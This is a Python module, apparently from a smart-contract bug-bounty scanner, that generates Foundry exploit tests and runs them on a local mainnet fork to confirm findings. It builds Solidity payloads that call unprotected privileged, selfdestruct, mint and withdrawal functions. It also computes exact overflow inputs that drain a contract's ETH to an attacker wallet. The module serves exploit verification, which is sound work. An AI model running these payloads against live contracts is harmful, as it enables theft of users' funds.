"""Dynamic verification: run each candidate finding's exploit PAYLOAD on a mainnet fork with Foundry.

A static detector only points at suspicious code. This stage proves (or disproves) exploitability the
only way that is sound: fork mainnet at the latest block, prank an unprivileged attacker, fire the
minimal exploit call(s), and read the result. If the payload reverts or moves no funds/state, it is NOT
a finding and is dropped. Nothing is ever broadcast - every call runs inside the local fork.

Scope, honestly: the payload is auto-generated for the classes where a generic attempt is decisive -
unprotected privileged functions (does an unauthorized call revert?), selfdestruct (does the contract
actually die / pay the attacker?), free mint, caller-chosen withdrawal, burn-from. Multi-step exploits
(reentrancy, signature replay) can't be proven by a generic payload, so they are marked
`manual` rather than falsely auto-confirmed.
"""
from __future__ import annotations

import math
import re
import shutil
import os
import subprocess
from dataclasses import dataclass
from pathlib import Path

from .solidity import Function, SourceFile

# The attacker / receiving wallet: the exploit routes stolen funds HERE and confirms they land.
# "Funds moved to a wallet" is the theory of impact, so we check THIS wallet's balance delta.
# Override per deployment with BOUNTYSCAN_ATTACKER_WALLET.
ATTACKER_WALLET = os.environ.get("BOUNTYSCAN_ATTACKER_WALLET", "0xE4754d8237C9528FC23E81F9BB8F0aEE9B646bF8")


def _addr_literal(addr: str) -> str:
    """Embed an address as a NUMBER, not an address literal, so Solidity's EIP-55 checksum rule never
    rejects the lowercase from-DB address. A bare 40-hex `0x..` is still parsed as an address (checksum
    enforced even inside uint160(...)); the compiler's own escape is to prepend '00' -> 42 hex digits is
    a plain number, and uint160() takes the low 160 bits back to the address."""
    h = re.sub(r"[^0-9a-fA-F]", "", addr.lower().replace("0x", "")).rjust(40, "0")
    return f"address(uint160(0x00{h}))"


def forge_bin() -> str | None:
    """Locate the forge binary, robust to which user runs the service (the server runs as root but forge
    may live in another user's ~/.foundry). Order: BOUNTYSCAN_FORGE, PATH, common install dirs."""
    import glob
    candidates = [os.environ.get("BOUNTYSCAN_FORGE"), shutil.which("forge"),
                  "/usr/local/bin/forge", str(Path.home() / ".foundry" / "bin" / "forge")]
    candidates += sorted(glob.glob("/home/*/.foundry/bin/forge")) + sorted(glob.glob("/root/.foundry/bin/forge"))
    for c in candidates:
        if c and Path(c).exists():
            return c
    return None


def forge_available() -> bool:
    return forge_bin() is not None


# Detector ids whose exploit a generic payload can decide. Everything else -> manual.
AUTO_VERIFIABLE = {
    "unprotected-privileged-function",
    "unprotected-selfdestruct",
    "unrestricted-mint",
    "arbitrary-recipient-withdrawal",
    "unrestricted-burn-from",
}

# ---------------------------------------------------------------------------------------------
# Phase 3 - sound state injection, classified into tiers.
#
# Blind `vm.store` injection re-introduces false positives: a synthetic balance/role does not mean
# the attacker can acquire it on mainnet, so draining with it "confirms" an exploit no one can run.
# The ONLY injections that stay sound are those using state an attacker could really produce. Every
# injection is classified; Tier 4 (fabricated balance/role) is REFUSED, never auto-confirmed.
INJECTION_TIERS = {
    1: "realistic-input",     # attacker-crafted calldata (overflow / precision loss) - NOTHING injected
    2: "flash-loan",          # vm.deal ETH to borrow -> attack -> repay; profit measured AFTER repay
    3: "historical-replay",   # a real (v,r,s) / calldata pulled from the chain, replayed
    4: "fabricated-state",    # FORBIDDEN: a balance or role the attacker cannot acquire on mainnet
}
TIER4_CAVEAT = ("exploitable only if combined with an external token-acquisition / role-grant vector; "
                "held LATENT-MANUAL to avoid fabricating the prerequisite state")

M256 = 1 << 256


def overflow_amount(target_product: int, multiplier: int, bits: int = 256) -> int | None:
    """Smallest positive `amount` with (amount * multiplier) mod 2**bits == target_product - i.e. the
    caller-chosen input that makes an unchecked multiplication WRAP around to exactly `target_product`.

    This is Tier-1: a real transaction argument, not fabricated state. The EVM would genuinely compute
    this product; nothing is injected. Returns None when no such amount exists (gcd(multiplier, 2**bits)
    does not divide target_product).

    AkivaCoin regression (`sell(amount)`, odd sellPrice): the product wraps to the contract's wei
    balance, so one call drains it. Pure modular arithmetic - the exact exploit the EVM runs.
    """
    M = 1 << bits
    s = multiplier % M
    t = target_product % M
    if s == 0:
        return None
    g = math.gcd(s, M)
    if t % g != 0:
        return None                      # linear congruence unsatisfiable -> overflow can't hit the target
    s2, m2, t2 = s // g, M // g, (t // g) % (M // g)
    amount = (pow(s2, -1, m2) * t2) % m2
    amount = amount or m2                 # nonzero
    # Return the smallest solution that ACTUALLY overflows (true product >= 2**bits). When g>1 the
    # solutions are spaced by m2 and each step adds g-many 2**bits multiples to the true product, so the
    # trivial small solution (e.g. AkivaCoin's 192, a normal non-overflowing sale) is skipped - reporting
    # it would be a false positive. When g==1 the solution is unique and already ~2**bits-scale.
    if g > 1 and amount * s < M:
        amount += m2
    return amount


def classify_overflow(fn, state_vars) -> tuple[int, str]:
    """Classify a pre-0.8 overflow finding into an injection tier WITHOUT fabricating state.

    Tier 1 (sound, no injection): the overflow happens INSIDE a balance guard - e.g. batchOverflow,
    `require(balances[msg.sender] >= cnt * value)` where `cnt * value` wraps to ~0, so the check passes
    with ZERO attacker balance and credits other accounts. The attacker needs nothing they can't get.

    Tier 4 (forbidden): the guard checks a raw caller amount (`require(balanceOf[msg.sender] >= amount)`)
    that only overflows later in a payout - exploiting it needs `amount` tokens the attacker cannot hold,
    so it is held LATENT-MANUAL instead of confirmed with a fabricated balance.
    """
    body = getattr(fn, "body", "") or ""
    # A guard whose compared expression is itself a product of caller-chosen values -> the overflow
    # defeats the guard, no pre-existing balance required.
    guard_has_product = re.search(
        r"(?:require|assert|if)\s*\([^;{]*\b\w+\s*\[[^\]]*\][^;{]*(?:>=|<=|>|<)[^;{]*\w+\s*\*\s*\w+", body)
    if guard_has_product:
        return 1, INJECTION_TIERS[1]
    # A guard that bounds a single caller amount against the caller's own balance -> Tier 4 prerequisite.
    guard_on_amount = re.search(
        r"(?:require|assert)\s*\([^;{]*balance[^;{]*\[\s*msg\.sender\s*\][^;{]*(?:>=|>)\s*\w+", body, re.I)
    if guard_on_amount:
        return 4, INJECTION_TIERS[4]
    # No balance guard in the way (pure credit/payout by a caller-chosen amount) -> Tier 1 as well.
    return 1, INJECTION_TIERS[1]


@dataclass
class PayloadVerdict:
    finding: object                  # the Finding
    outcome: str                     # confirmed | reverted | no_change | manual | error
    detail: str                      # human-readable one-liner for the report
    profit_wei: int | None = None
    metrics: dict | None = None      # measured deltas: att_wei/att_tok/tgt_wei/tgt_tok/code/call_ok
    injected: str = ""               # Phase-3 state injection applied (vm.deal / stdstore), if any

    @property
    def status_word(self) -> str:
        return {"confirmed": "CONFIRMED EXPLOIT", "manual": "LATENT / MANUAL REVIEW",
                "conditional": "LOGIC-CONFIRMED (ECONOMICALLY CONDITIONAL)",
                "reverted": "FALSE POSITIVE", "no_change": "FALSE POSITIVE",
                "error": "NOT RUN"}.get(self.outcome, self.outcome.upper())

    @property
    def is_finding(self) -> bool:
        # A payload that reverted or moved nothing is NOT a finding. `manual`/`error` are kept
        # (we could not prove the negative), `confirmed` is kept.
        return self.outcome not in ("reverted", "no_change")

    def report_line(self) -> str:
        icon = {"confirmed": "CONFIRMED", "reverted": "NOT REPRODUCIBLE (reverted)",
                "no_change": "NOT REPRODUCIBLE (no state/funds moved)",
                "conditional": "LOGIC CONFIRMED (economically conditional)",
                "manual": "MANUAL PoC REQUIRED", "error": "NOT RUN"}[self.outcome]
        return f"Payload attack: {icon} - {self.detail}"


def canonical_sig(fn: Function) -> str:
    """`name(type1,type2)` with data locations stripped and uint/int widened to 256."""
    types = []
    for p in fn.params:
        t = p.type.strip()
        t = re.sub(r"\b(memory|calldata|storage|payable)\b", "", t).strip()
        if re.fullmatch(r"uint", t):
            t = "uint256"
        elif re.fullmatch(r"int", t):
            t = "int256"
        # user-defined types (structs/enums/contracts) are not ABI-encodable generically -> bail
        types.append(t)
    return f"{fn.name}({','.join(types)})"


def _encodable(fn: Function) -> bool:
    """Only elementary ABI types can be auto-encoded with abi.encodeWithSignature."""
    ok = re.compile(r"^(address|bool|string|bytes\d*|u?int\d*|(?:address|bool|bytes\d*|u?int\d*)\[\d*\])$")
    for p in fn.params:
        t = re.sub(r"\b(memory|calldata|storage|payable)\b", "", p.type).strip()
        t = {"uint": "uint256", "int": "int256"}.get(t, t)
        if not ok.match(t):
            return False
    return True


def _arg_for(ptype: str, *, amount: bool) -> str:
    """An attacker-favourable literal for a parameter: attacker address, a nonzero amount where it
    helps (mint/withdraw), empty bytes/strings, zero otherwise."""
    t = re.sub(r"\b(memory|calldata|storage|payable)\b", "", ptype).strip()
    if t.endswith("[]"):
        return "new " + t.replace("uint ", "uint256 ").replace("int ", "int256 ") + "(0)"
    if t == "address":
        return "attacker"
    if t == "bool":
        return "false"
    if t == "string":
        return '""'
    if re.fullmatch(r"bytes\d+", t):
        return f"bytes{t[5:] or ''}(0)" if t != "bytes" else '""'
    if t == "bytes":
        return '""'
    if re.fullmatch(r"u?int\d*", t):
        return "1000000000000000000" if amount else "0"
    return "0"


def _args(fn: Function, *, amount_param_hint: bool) -> str:
    out = []
    for p in fn.params:
        t = re.sub(r"\b(memory|calldata|storage|payable)\b", "", p.type).strip()
        is_amount = amount_param_hint and re.fullmatch(r"u?int\d*", {"uint": "uint256", "int": "int256"}.get(t, t) or "") \
            and re.search(r"amount|amt|value|shares|qty|quantity|wad|tokens?", p.name or "", re.I)
        out.append(_arg_for(p.type, amount=bool(is_amount)))
    return ", ".join(out)


_HEADER = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {{Test, console2}} from "forge-std/Test.sol";
contract ExploitPoC is Test {{
    address constant TARGET = {target};
    address constant attacker = {attacker};   // receiving wallet - stolen funds must land here
    function setUp() public {{ vm.deal(attacker, 10 ether); }}   // gas stipend; impact measured as a DELTA
    // balanceOf that never reverts: returns 0 if TARGET is not an ERC-20.
    function _tok(address who) internal view returns (uint256) {{
        (bool s, bytes memory d) = TARGET.staticcall(abi.encodeWithSignature("balanceOf(address)", who));
        return (s && d.length >= 32) ? abi.decode(d, (uint256)) : 0;
    }}
    function test_payload() public {{
"""
_FOOTER = "    }\n}\n"


def build_exploit(finding, fn: Function, target: str, wallet: str = ATTACKER_WALLET) -> str | None:
    """Full Exploit.t.sol for an auto-verifiable finding, or None if it must be verified manually."""
    det = finding.detector
    if det not in AUTO_VERIFIABLE or fn is None or not _encodable(fn):
        return None
    sig = canonical_sig(fn)
    body = _HEADER.format(target=_addr_literal(target), attacker=_addr_literal(wallet))
    # prank with BOTH msg.sender and tx.origin = attacker, so a legitimate guard reverts the call.
    if det == "unprotected-selfdestruct":
        body += (
            "        uint256 codeBefore = TARGET.code.length;\n"
            "        uint256 attBefore = attacker.balance;\n"
            f'        vm.startPrank(attacker, attacker);\n'
            f'        (bool ok, ) = TARGET.call(abi.encodeWithSignature("{sig}", {_args(fn, amount_param_hint=False)}));\n'
            "        vm.stopPrank();\n"
            '        console2.log("CALL_OK", ok);\n'
            '        console2.log("CODE_DELTA", int256(TARGET.code.length) - int256(codeBefore));\n'
            '        console2.log("ATTACKER_WEI_DELTA", int256(attacker.balance) - int256(attBefore));\n'
        )
    elif det in ("unrestricted-mint", "unrestricted-burn-from"):
        body += (
            "        uint256 tb = _tok(attacker);\n"
            f'        vm.startPrank(attacker, attacker);\n'
            f'        (bool ok, ) = TARGET.call(abi.encodeWithSignature("{sig}", {_args(fn, amount_param_hint=True)}));\n'
            "        vm.stopPrank();\n"
            '        console2.log("CALL_OK", ok);\n'
            '        console2.log("TOKEN_DELTA", int256(_tok(attacker)) - int256(tb));\n'
            '        console2.log("ATTACKER_WEI_DELTA", int256(0));\n'
        )
    else:  # unprotected-privileged-function / arbitrary-recipient-withdrawal
        body += (
            "        uint256 attBefore = attacker.balance;\n"
            "        uint256 tokBefore = _tok(attacker);\n"
            "        uint256 tgtWei = TARGET.balance;\n"
            "        uint256 tgtTok = _tok(TARGET);\n"
            f'        vm.startPrank(attacker, attacker);\n'
            f'        (bool ok, ) = TARGET.call(abi.encodeWithSignature("{sig}", {_args(fn, amount_param_hint=True)}));\n'
            "        vm.stopPrank();\n"
            '        console2.log("CALL_OK", ok);\n'
            '        console2.log("ATTACKER_WEI_DELTA", int256(attacker.balance) - int256(attBefore));\n'
            '        console2.log("TOKEN_DELTA", int256(_tok(attacker)) - int256(tokBefore));\n'
            '        console2.log("TARGET_WEI_DELTA", int256(TARGET.balance) - int256(tgtWei));\n'
            '        console2.log("TARGET_TOK_DELTA", int256(_tok(TARGET)) - int256(tgtTok));\n'
        )
    return body + _FOOTER


_LOG_RE = re.compile(r"^\s*(CALL_OK|CODE_DELTA|ATTACKER_WEI_DELTA|TOKEN_DELTA|TARGET_WEI_DELTA|TARGET_TOK_DELTA)\s+(-?\d+|true|false)\s*$", re.M)


def parse_outcome(finding, stdout: str) -> PayloadVerdict:
    """Interpret the forge logs into a verdict. Compilation/exec failures -> error (kept, not dropped)."""
    if "Compiler run failed" in stdout or "Error (" in stdout and "test_payload" not in stdout:
        return PayloadVerdict(finding, "error", "payload did not compile against this target")
    vals = {k: v for k, v in _LOG_RE.findall(stdout)}
    if "CALL_OK" not in vals:
        # forge ran but produced no logs (revert in setUp, fork error, timeout handled upstream)
        return PayloadVerdict(finding, "error", "exploit test produced no result")
    call_ok = vals["CALL_OK"] == "true"
    wei = int(vals.get("ATTACKER_WEI_DELTA", "0"))
    tok = int(vals.get("TOKEN_DELTA", "0"))
    code = int(vals.get("CODE_DELTA", "0"))
    tgt_wei = int(vals.get("TARGET_WEI_DELTA", "0"))
    tgt_tok = int(vals.get("TARGET_TOK_DELTA", "0"))
    target_lost = tgt_wei < 0 or tgt_tok < 0     # 200% differential: the TARGET must actually lose funds
    det = finding.detector
    metrics = {"call_ok": call_ok, "att_wei": wei, "att_tok": tok, "tgt_wei": tgt_wei,
               "tgt_tok": tgt_tok, "code": code}
    injected = "vm.deal: 10 ETH to the attacker (gas / flash-loan stake)"

    def mk(outcome, detail, profit=None):
        return PayloadVerdict(finding, outcome, detail, profit, metrics=metrics, injected=injected)

    if not call_ok:
        return mk("reverted", "an unprivileged attacker's call reverts - the access guard holds")
    w = ATTACKER_WALLET
    if det == "unprotected-selfdestruct":
        if code < 0:
            return mk("confirmed", "selfdestruct destroyed the contract code", wei)
        if wei > 0:
            return mk("confirmed", f"selfdestruct moved {wei} wei to the wallet {w}", wei)
        return mk("no_change", "call succeeds but code intact and no funds moved (post-Cancun / fallback)")
    if det in ("unrestricted-mint",):
        return (mk("confirmed", f"{tok} tokens freshly minted to the wallet {w}", tok) if tok > 0
                else mk("no_change", "call succeeds but the wallet's balance is unchanged"))
    if det in ("arbitrary-recipient-withdrawal",):
        gain = max(wei, tok)
        # 200% differential: the wallet must GAIN and the target must LOSE the same funds. A gain with no
        # target loss (minted/rebased/returned) or a success with no movement is a fallback trap -> drop.
        if gain > 0 and target_lost:
            return mk("confirmed", f"{gain} (wei/token) drained from the target to the wallet {w}", gain)
        return mk("no_change", "withdrawal call succeeds but the target did not lose funds to the wallet (fallback / no drain)")
    if det == "unrestricted-burn-from":
        return mk("manual", "burn-from needs a funded victim; verify by hand")
    # privileged-function: confirmed only if the wallet gained AND the target lost the same funds.
    if (wei > 0 or tok > 0) and target_lost:
        return mk("confirmed", f"unauthorized call drained {max(wei, tok)} from the target to the wallet {w}", max(wei, tok))
    return mk("manual", "unauthorized call does NOT revert - no funds moved to the wallet generically; confirm the impact by hand")


def overflow_verdict(finding, fn, state_vars) -> PayloadVerdict:
    """Classify a pre-0.8 overflow finding into a sound injection tier and describe the Tier-1 crafted
    input - WITHOUT fabricating attacker state. Tier-1 overflows are real inputs the EVM would run;
    Tier-4 ones need balances/roles the attacker can't acquire and are held LATENT-MANUAL, never
    confirmed with injected state. The exact wrap-around amount is computed from live values at fork
    time via `overflow_amount()`; here we record the attack shape and tier for the forensic report."""
    tier, label = classify_overflow(fn, state_vars or set())
    metrics = {"call_ok": None, "att_wei": 0, "att_tok": 0, "tgt_wei": 0, "tgt_tok": 0, "code": 0}
    if tier == 4:
        inj = f"Tier 4 ({label}) - REFUSED: {TIER4_CAVEAT}"
        detail = ("unchecked arithmetic, but the exploit needs tokens/role the attacker cannot acquire; "
                  "not confirmed with a fabricated balance (would be a false positive)")
    else:
        inj = (f"Tier 1 ({label}) - a crafted caller input whose product wraps 2**256; nothing injected. "
               "Exact amount = overflow_amount(live target, live multiplier) at fork time.")
        detail = ("caller-chosen input overflows the unchecked multiplication, bypassing the balance "
                  "guard with no pre-existing balance - run the computed wrap input on a fork to confirm")
    return PayloadVerdict(finding, "manual", detail, metrics=metrics, injected=inj)


_MUL_OPERAND_RE = re.compile(r"\b(\w+)\s*\*\s*(\w+)")


def _overflow_multiplier(fn) -> str | None:
    """From a `sell`-like body, find the state var the caller amount is multiplied by (e.g. sellPrice).
    Returns the operand that is NOT a function parameter - that's the on-chain multiplier we read live."""
    body = getattr(fn, "body", "") or ""
    params = {p.name for p in getattr(fn, "params", []) if getattr(p, "name", None)}
    for a, b in _MUL_OPERAND_RE.findall(body):
        if a in params and b not in params and b.isidentifier() and not b.isdigit():
            return b
        if b in params and a not in params and a.isidentifier() and not a.isdigit():
            return a
    return None


# Two-pass Tier-1 overflow PoC (validated live against AkivaCoin on a mainnet fork).
#   Pass 1 (reader): read the live multiplier (e.g. sellPrice), totalSupply and the target's ETH balance.
#   Python then computes the EXACT smallest *overflowing* input with overflow_amount() - general over even
#   multipliers (gcd), unlike an odd-only on-chain inverse, and skipping the trivial non-overflowing
#   solution (AkivaCoin's 192 is a normal sale, not an exploit).
#   Pass 2 (exploit): inject that exact token balance via stdstore (checked_write reverts on a wrong slot -
#   no silent fabrication), fire the call, and measure the 200% differential. The ETH drained is the
#   target's own; only the token prerequisite is injected, so the verdict is CONDITIONAL with the economic
#   caveat (required tokens vs total supply -> THEORETICAL or CRITICAL).
_OVERFLOW_READER = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {{Test, console2}} from "forge-std/Test.sol";
contract OverflowReader is Test {{
    address constant TARGET = {target};
    function _u(bytes memory sig) internal view returns (uint256 v) {{
        (bool ok, bytes memory d) = TARGET.staticcall(sig);
        if (ok && d.length >= 32) v = abi.decode(d, (uint256));
    }}
    function test_read() public view {{
        console2.log("OVF_PRICE", _u(abi.encodeWithSignature("{mul}()")));
        console2.log("OVF_SUPPLY", _u(abi.encodeWithSignature("totalSupply()")));
        console2.log("OVF_TGT_ETH", TARGET.balance);
    }}
}}
"""

_OVERFLOW_EXPLOIT = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {{Test, console2, stdStorage, StdStorage}} from "forge-std/Test.sol";
contract OverflowExploit is Test {{
    using stdStorage for StdStorage;
    address constant TARGET = {target};
    function test_overflow() public {{
        address attacker = makeAddr("attacker");
        uint256 amount = {amount};          // exact smallest overflowing input: amount*multiplier wraps to the ETH balance
        console2.log("OVF_AMOUNT", amount);
        console2.log("OVF_SUPPLY", uint256({supply}));
        // TARGETED injection: give the attacker the exact token balance the math needs; checked_write
        // reverts if the balanceOf slot can't be resolved, so we never fabricate against the wrong slot.
        try this._inject(attacker, amount) {{}} catch {{ console2.log("OVF_INJECT_FAIL", uint256(1)); return; }}
        uint256 ethBefore = TARGET.balance;
        uint256 attBefore = attacker.balance;
        vm.prank(attacker, attacker);
        (bool ok, ) = TARGET.call(abi.encodeWithSignature("{sell}", amount));
        console2.log("OVF_CALL_OK", ok);
        console2.log("OVF_ATT_ETH_GAIN", int256(attacker.balance) - int256(attBefore));
        console2.log("OVF_TGT_ETH_DELTA", int256(TARGET.balance) - int256(ethBefore));
    }}
    function _inject(address who, uint256 amt) external {{
        stdstore.target(TARGET).sig("balanceOf(address)").with_key(who).checked_write(amt);
    }}
}}
"""


def build_overflow_reader(fn, target: str) -> str | None:
    """Pass-1 reader for the live multiplier / supply / balance, or None if the overflow shape isn't a
    caller-amount * on-chain multiplier, or it's Tier-4 (fabricated prerequisite -> never auto-run)."""
    if fn is None or classify_overflow(fn, set())[0] == 4 or not _encodable(fn):
        return None
    mul = _overflow_multiplier(fn)
    return _OVERFLOW_READER.format(target=_addr_literal(target), mul=mul) if mul else None


def build_overflow_literal(fn, target: str, amount: int, supply: int) -> str | None:
    """Pass-2 exploit with the exact Python-computed overflowing amount injected into the attacker."""
    if fn is None or not _encodable(fn) or amount is None or amount <= 0:
        return None
    return _OVERFLOW_EXPLOIT.format(target=_addr_literal(target), sell=canonical_sig(fn),
                                    amount=int(amount), supply=int(supply))


def parse_overflow_reader(stdout: str):
    """(price, supply, balance) from the reader logs, or None if it didn't produce them."""
    vals = {k: v for k, v in _OVF_RE.findall(stdout)}
    if "OVF_PRICE" not in vals or "OVF_TGT_ETH" not in vals:
        return None
    return int(vals["OVF_PRICE"]), int(vals.get("OVF_SUPPLY", "0")), int(vals["OVF_TGT_ETH"])


_OVF_RE = re.compile(r"^\s*(OVF_[A-Z_]+)\s+(-?\d+|true|false)\s*$", re.M)


def parse_overflow_outcome(finding, stdout: str, fallback: "PayloadVerdict") -> "PayloadVerdict":
    """Interpret the overflow PoC logs. LOGIC proven + target drained -> CONDITIONAL (with the economic
    precondition). Reverted -> dropped. No logs / compile fail -> the static tier fallback (never a
    fabricated confirm)."""
    vals = {k: v for k, v in _OVF_RE.findall(stdout)}
    if "OVF_CALL_OK" not in vals:
        return fallback                    # skipped (even/zero price), inject failed, or didn't compile
    call_ok = vals["OVF_CALL_OK"] == "true"
    att_gain = int(vals.get("OVF_ATT_ETH_GAIN", "0"))
    tgt_delta = int(vals.get("OVF_TGT_ETH_DELTA", "0"))
    amount = int(vals.get("OVF_AMOUNT", "0"))
    supply = int(vals.get("OVF_SUPPLY", "0"))
    price = int(vals.get("OVF_PRICE", "0"))
    gt_supply = (vals.get("OVF_AMOUNT_GT_SUPPLY") == "true") or (supply > 0 and amount > supply)
    metrics = {"call_ok": call_ok, "att_wei": att_gain, "att_tok": 0,
               "tgt_wei": tgt_delta, "tgt_tok": 0, "code": 0}
    pr = f" (= contractEth * modinv(price {price}))" if price else ""
    injected = (f"Tier 1 vm.store (stdstore-verified): attacker balanceOf set to the exact wrap amount "
                f"{amount}{pr}; the ETH drained is the target's own, not injected")
    if not call_ok:
        return PayloadVerdict(finding, "reverted", "overflow call reverts - SafeMath/checked arithmetic "
                              "holds, or the balance guard can't be bypassed", metrics=metrics, injected=injected)
    if tgt_delta < 0 and att_gain > 0:
        econ = ("the required token balance EXCEEDS total supply, so it is acquirable only via a separate "
                "mint/inflation bug -> THEORETICAL unless chained" if gt_supply else
                "the required token balance is within total supply, so it is CRITICAL if those tokens are "
                "buyable for less than the drained ETH")
        detail = (f"unchecked `amount*{price}` overflow drains {-tgt_delta} wei from the target to the "
                  f"attacker. Economic precondition: holding {amount} tokens (supply {supply}) - {econ}")
        return PayloadVerdict(finding, "conditional", detail, profit_wei=-tgt_delta,
                              metrics=metrics, injected=injected)
    return PayloadVerdict(finding, "no_change", "overflow call succeeds but the target lost no ETH "
                          "(payout path differs) - not reproduced", metrics=metrics, injected=injected)


def _function_of(files: list[SourceFile], finding) -> Function | None:
    for f in files:
        for c in f.contracts:
            if c.name == finding.contract:
                for fn in c.functions:
                    if fn.name == finding.function:
                        return fn
    return None


def run_payloads(findings: list, files: list[SourceFile], target: str, rpc_url: str | None,
                 fork_block: int | None = None, timeout: int = 300, workdir: Path | None = None,
                 wallet: str = ATTACKER_WALLET) -> list[PayloadVerdict]:
    """Build + run one exploit per finding. Returns a verdict per finding (same order)."""
    forge = forge_bin()
    verdicts: list[PayloadVerdict] = []
    if not forge or not rpc_url:
        reason = "forge not installed" if not forge else "no fork RPC configured"
        return [PayloadVerdict(f, "error", f"payload not run: {reason}") for f in findings]

    # One shared project (forge-std installed once) - the target is a constant in each generated test,
    # so there is no need for a per-target project, and we avoid a slow/flaky install on every contract.
    proj = Path(workdir or (Path.home() / ".bountyscan_forge" / "shared"))
    (proj / "test").mkdir(parents=True, exist_ok=True)
    (proj / "foundry.toml").write_text('[profile.default]\nsrc="src"\ntest="test"\nlibs=["lib"]\n', encoding="utf-8")
    if not _ensure_forge_std(proj, forge):
        return [PayloadVerdict(f, "error", "payload not run: forge-std unavailable") for f in findings]

    for f in findings:
        fn = _function_of(files, f)
        if f.detector == "pre-0.8-overflow" and fn is not None:
            # Phase 3 Tier-1: two-pass. Read live price/supply/balance, compute the exact overflowing
            # amount in Python, then inject + drain. Any gap -> static tier classification (never fabricated).
            static = overflow_verdict(f, fn, None)
            reader = build_overflow_reader(fn, target)
            if reader is None:
                verdicts.append(static)
                continue
            fb = (["--fork-block-number", str(fork_block)] if fork_block else [])
            try:
                (proj / "test" / "Exploit.t.sol").write_text(reader, encoding="utf-8")
                r = subprocess.run([forge, "test", "--mp", "test/Exploit.t.sol", "--fork-url", rpc_url, "-vv"] + fb,
                                   cwd=proj, capture_output=True, text=True, timeout=timeout)
                read = parse_overflow_reader(r.stdout + "\n" + r.stderr)
                amount = overflow_amount(read[2], read[0]) if (read and read[0] and read[2]) else None
                lit = build_overflow_literal(fn, target, amount, read[1]) if (read and amount) else None
                if lit is None:
                    verdicts.append(static)
                    continue
                (proj / "test" / "Exploit.t.sol").write_text(lit, encoding="utf-8")
                r2 = subprocess.run([forge, "test", "--mp", "test/Exploit.t.sol", "--fork-url", rpc_url, "-vv"] + fb,
                                    cwd=proj, capture_output=True, text=True, timeout=timeout)
                verdicts.append(parse_overflow_outcome(f, r2.stdout + "\n" + r2.stderr, static))
            except subprocess.TimeoutExpired:
                verdicts.append(static)
            except Exception:
                verdicts.append(static)
            continue
        test = build_exploit(f, fn, target, wallet) if fn is not None else None
        if test is None:
            verdicts.append(PayloadVerdict(f, "manual", f"{f.detector}: no generic payload - verify by hand"))
            continue
        (proj / "test" / "Exploit.t.sol").write_text(test, encoding="utf-8")
        cmd = [forge, "test", "--mp", "test/Exploit.t.sol", "--fork-url", rpc_url, "-vv"]
        if fork_block:
            cmd += ["--fork-block-number", str(fork_block)]
        try:
            r = subprocess.run(cmd, cwd=proj, capture_output=True, text=True, timeout=timeout)
            verdicts.append(parse_outcome(f, r.stdout + "\n" + r.stderr))
        except subprocess.TimeoutExpired:
            verdicts.append(PayloadVerdict(f, "error", "exploit test timed out"))
        except Exception as exc:
            verdicts.append(PayloadVerdict(f, "error", f"forge run failed: {exc}"))
    return verdicts


def _ensure_forge_std(proj: Path, forge: str) -> bool:
    if (proj / "lib" / "forge-std" / "src" / "Test.sol").exists():
        return True
    try:
        subprocess.run([forge, "install", "foundry-rs/forge-std", "--no-git", "--root", str(proj)],
                       capture_output=True, text=True, timeout=180)
    except Exception:
        pass
    return (proj / "lib" / "forge-std" / "src" / "Test.sol").exists()
